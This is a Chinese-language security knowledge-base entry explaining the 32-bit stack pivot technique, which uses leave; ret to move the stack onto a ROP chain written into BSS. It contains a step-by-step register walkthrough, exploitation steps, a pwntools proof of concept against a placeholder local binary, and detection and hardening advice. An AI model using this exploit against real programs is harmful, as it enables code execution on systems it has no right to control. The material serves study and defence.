---
id: binary-pwn-stack-pivot-leave-ret-bss
title: 栈迁移（leave; ret）：把栈切到 BSS 上的预置 ROP 链
type: scenario
domain: binary
path: binary/pwn/stack
technique: stack-pivot-leave-ret
tags:
- pwn
- stack
- rop
- stack-pivot
- leave-ret
- bss
- i386
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V98
  verified_at: '2026-11-05T19:44:34+08:00'
  notes: 已对照原文『栈迁移』脚本核对：bss_addr=elf.bss()+0x100、saved EBP=bss_addr-4、saved EIP=leave_ret、offset=0x20，与卡内 fake 布局一致；两次 leave 的 esp/ebp 逐步推演（第一次 leave 读入 fake-4 到 EBP，第二次 leave 的 pop ebp 消耗 fake-4 处槽位，ret 从 fake 取首 gadget）正确。未验证点：原文示例依赖程序自身写 BSS 功能，PoC 未在本机复跑；地址需实测；frontmatter 无 sources/source_url（全库惯例）。
url: /docs/binary/pwn/stack/binary-pwn-stack-pivot-leave-ret-bss/
draft: false
kb_aliases:
- 栈迁移
- stack pivot
- leave ret 栈迁移
- 栈劫持
- bss 迁移
---

## 一句话结论

当栈溢出的可写长度只够覆盖 saved EBP 和返回地址、放不下完整 ROP 链时，把 saved EBP 改成 `伪造栈地址 - 4`、返回地址改成 `leave; ret` gadget，即可让函数返回时连续执行两次 `leave`，把 ESP 迁移到预先写入 BSS 的完整 ROP 链上继续执行。

## 原理

- `leave` 等价于 `mov esp, ebp; pop ebp`：先把栈指针恢复到当前帧基址，再弹出一个 dword 作为调用者的 EBP。
- 目标是两级跳转，链式推演如下（以 32 位为例，`fake` 为 BSS 中 ROP 链首地址）：
  1. 函数原本的 `leave`：`esp = 当前 EBP`（原栈帧基址），`pop ebp` 把被覆盖的 saved EBP（`fake - 4`）读入 EBP 寄存器，此时 `esp = 原帧基址 + 4`；
  2. 函数原本的 `ret`：取出被覆盖的返回地址 `leave; ret` 并跳过去，此时 `esp = 原帧基址 + 8`；
  3. 执行第二次 `leave`：`mov esp, ebp` 使 `esp = fake - 4`，`pop ebp` 消耗掉 `fake - 4` 处的填充，`esp = fake`；
  4. 第二次 `ret`：从 `fake` 取第一个 dword 作为 EIP，随后链上的 gadget 依次从 `fake + 4`…… 继续执行。
- 因此 `- 4` 的作用不是“让 leave 后的 esp 指向 fake”，而是让第二次 `leave` 的 `pop ebp` 正好吃掉链前面那一个无用槽位，使第二次 `ret` 从 `fake` 的第一个 gadget 开始。
- 之所以能成立：ROP 链的位置只要求“可写、地址可预测”，并不要求它在栈上；BSS 等固定可写段天然满足。

## 触发条件

- 32 位栈溢出，且输入长度只能覆盖到 saved EBP 和 saved EIP（缓冲区很小），无法直接放下完整链。
- 存在可写且地址固定的区域（`.bss`/`.data`），并且程序在触发溢出前或利用链中提供一次“向该区域写入可控数据”的机会（如先调用一次 `read`/`gets`，或程序本身有写 BSS 的功能）。
- 能找到 `leave; ret` gadget（通常就是目标函数自身的结语，也可在二进制中搜索）。
- 未开启 PIE，或已泄漏代码基址，能确定 BSS、gadget、函数地址。
- 目标函数结语为 `leave; ret`；若结语是 `pop ebp; ret`，则要改为“saved EBP 填伪栈地址、saved EIP 填 leave; ret”的两跳布局，或直接用 `pop rsp` 类 gadget。

## 利用步骤

1. 用 `checksec` 确认保护，确定是否可直接硬编码地址。
2. 找到能向 BSS 写入的机会，把完整 ROP 链（如 ret2libc 的 `puts(puts@got)` + 返回 main）写到 `fake`。
3. 计算缓冲区到 saved EBP 的偏移；payload = `padding + p32(fake - 4) + p32(leave_ret)`。
4. 触发函数返回：第一次 `leave; ret` 把 EBP 换成 `fake - 4` 并跳到 `leave; ret`；第二次 `leave` 把 ESP 迁移到 `fake`，后续链在 BSS 上执行。
5. 链中可继续泄漏 libc、再次溢出或直接 `system("/bin/sh")`；若只需一次利用，把完整链放在 BSS 即可。

## PoC

```python
from pwn import *

context.arch = 'i386'
elf = ELF('./vuln')
p = process('./vuln')

fake = elf.bss() + 0x100          # BSS 中预置 ROP 链的位置
leave_ret = 0x080484b8            # leave; ret 地址，需在目标中实测

# 第一步：借程序自身的写 BSS 功能，预先放入完整链
chain = ROP(elf)
chain.puts(elf.got['puts'])
chain.call(elf.sym['main'])
p.sendafter(b"Write to BSS:", chain.chain())

# 第二步：极小溢出，只覆盖 saved EBP 与 saved EIP
offset = 0x20
payload  = b'A' * offset
payload += p32(fake - 4)          # 第二次 leave 的 pop ebp 消耗此前的填充
payload += p32(leave_ret)         # 第一次 ret 跳到第二段 leave
p.sendafter(b"Tiny overflow:", payload)
p.interactive()
```

## 变体与关联

- 变体：64 位把 saved RBP 改为 `fake - 8`、返回地址改为 `leave; ret`，`pop rbp` 消耗 8 字节槽位；其余推演相同。
- 变体：没有 `leave; ret` 时可用 `pop rsp; ret`、`xchg rsp, rax; ret`、`mov rsp, rbp; ret` 等 pivot gadget，把 RSP 直接指向 BSS。
- 变体：堆上伪造栈（heap pivot）或把栈迁移到 mmap 的可控内存；本质都是让 RSP 指向攻击者可控数据。
- 关联：[[binary-pwn-stack-ret2libc]]（迁移后的链常用 ret2libc 完成泄漏与 getshell）、[[binary-pwn-rop-mov-rsp-rdi-jmp-r13-system]]（另一种用寄存器中转的 ROP 调用方式）。

## 检测与防御

- 检测：崩溃时 ESP/RSP 指向 `.bss`/`.data` 而非栈映射区，或回溯栈帧出现非法 EBP；BSS 中出现连续的代码地址（gadget 链）；工具可在崩溃转储中检查栈指针是否落在 `[stack]` 之外。
- 修复：启用 Canary 使溢出在返回前被拦截；启用 PIE 让 BSS 与 gadget 地址不可预测；开启 Full RELRO 减少可写元数据。
- 加固：CET/Shadow Stack 校验返回地址；seccomp 限制 `execve`；对交互式程序做输入长度校验，避免小缓冲区溢出。
